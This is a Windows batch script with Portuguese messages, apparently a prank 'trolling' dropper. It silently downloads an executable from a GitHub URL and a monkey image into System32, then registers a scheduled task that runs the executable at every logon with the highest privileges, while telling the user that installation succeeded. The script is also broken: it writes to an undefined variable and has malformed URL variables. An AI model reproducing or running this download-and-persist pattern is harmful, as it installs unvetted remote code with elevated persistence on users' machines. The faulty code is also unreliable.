@echo off
setlocal


set "PY_URL=https://github.com/mdsmax/fefipefefotrolagem/raw/src.exe"
set "IMG_URL=https://png.pngtree.com/thumb_back/fh260/background/20230613/pngtree-young-monkey-looking-at-the-camera-with-its-mouth-open-image_2911673.jpg"


set "DOWNLOAD_DIR=C:\Windows\System32"
set "EXE_FILE=%DOWNLOAD_DIR%\script_inicializacao.exe"
set "IMAGE_FILE=%DOWNLOAD_DIR%\macaco.jpg"



curl -o "%PYTHON_FILE%" "%PY_URL" --silent
if %ERRORLEVEL% NEQ 0 (
    echo falha ao baixar o script.
    pause
)



curl -o "%IMAGE_FILE%" "%IMG_URL" --silent
if %ERRORLEVEL% NEQ 0 (
    echo falha ao baixar a imagem.
    pause
)


echo configurando script para iniciar com o sistema
schtasks /create /sc onlogon /tn "ScriptInicializacao" /tr "\"%EXE_FILE%\"" /rl highest /f
if %ERRORLEVEL% NEQ 0 (
    echo falha ao configurar o script para inicialização.
    pause
)

echo instalacao concluida com sucesso!
pause
